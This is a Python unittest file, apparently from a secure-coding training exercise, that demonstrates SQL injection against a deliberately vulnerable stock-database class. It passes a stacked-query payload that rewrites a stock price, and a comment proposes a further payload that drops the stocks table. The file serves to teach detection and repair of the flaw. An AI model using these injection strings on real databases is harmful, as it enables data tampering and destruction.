'''
Please note:

The first file that you should run in this level is tests.py for database creation, with all tests passing.
Remember that running the hack.py will change the state of the database, causing some tests inside tests.py
to fail.

If you like to return to the initial state of the database, please delete the database (level-4.db) and run 
the tests.py again to recreate it.
'''

import unittest
import code as c

# code.py has 5 methods namely:
# (1) get_stock_info
# (2) get_stock_price
# (3) update_stock_price
# (4) exec_multi_query
# (5) exec_user_script

# All methods are vulnerable!

# Here we show an exploit against (2) get_stock_price which is applicable to
# methods (1) and (3) as well.

# We believe that methods (4) and (5) shouldn't exist at all in the code.
# Have a look on solution.py for the why.

class TestDatabase(unittest.TestCase):

    # performs an attack by passing another query.
    # Does so by using the semicolon so the method executes a script.
    def test_1(self):
        op = c.DB_CRUD_ops()

        # what the developer expects to be passed is this:
        developer_expectation = op.get_stock_price('MSFT')
        developer_output_expectation = "[METHOD EXECUTED] get_stock_price\n[QUERY] SELECT price FROM stocks WHERE symbol = 'MSFT'\n[RESULT] (300.0,)\n"

        # but the hacker passes is this:
        what_hacker_passes = op.get_stock_price("MSFT'; UPDATE stocks SET price = '525' WHERE symbol = 'MSFT'--")
        hacker_output = "[METHOD EXECUTED] get_stock_price\n[QUERY] SELECT price FROM stocks WHERE symbol = 'MSFT'; UPDATE stocks SET price = '525' WHERE symbol = 'MSFT'--'\n[SCRIPT EXECUTION]\n"

        self.assertEqual(developer_output_expectation, what_hacker_passes)

# Further exploit input could be:
# "MSFT'; DROP TABLE stocks--"
# through:
# op.get_stock_price("MSFT'; DROP TABLE stocks--")

if __name__ == '__main__':
    unittest.main()